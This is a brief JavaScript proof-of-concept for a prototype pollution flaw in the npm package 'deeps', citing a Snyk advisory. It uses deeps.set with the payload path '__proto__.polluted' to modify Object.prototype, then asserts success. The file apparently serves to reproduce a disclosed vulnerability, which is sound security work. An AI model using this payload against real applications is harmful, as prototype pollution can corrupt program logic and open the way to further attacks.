//https://snyk.io/vuln/SNYK-JS-DEEPS-598667
const deeps = require('deeps');
const { assert } = require("@firebase/util");
var obj = {}
console.log("Before : " + obj.polluted);
deeps.set({}, '__proto__.polluted', "yes");
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");